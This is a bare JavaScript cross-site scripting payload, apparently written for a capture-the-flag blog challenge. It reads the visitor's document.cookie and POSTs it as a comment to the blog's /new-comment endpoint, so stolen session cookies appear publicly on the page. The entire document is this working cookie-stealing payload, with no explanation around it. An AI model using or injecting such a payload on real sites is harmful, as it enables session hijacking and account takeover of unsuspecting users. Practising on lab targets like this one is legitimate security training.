const cookieValue = document.cookie;
fetch("http://blog.bc8cde18-a24.ctf.one.dr.punksecurity.cloud:5000/new-comment", {
    "headers": {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "upgrade-insecure-requests": "1"
    },
    "referrer": "http://blog.bc8cde18-a24.ctf.one.dr.punksecurity.cloud:5000/",
    "body": `name=${encodeURIComponent(cookieValue)}&comment=${encodeURIComponent(cookieValue)}`,
    "method": "POST",
    "mode": "cors",
    "credentials": "omit"
});
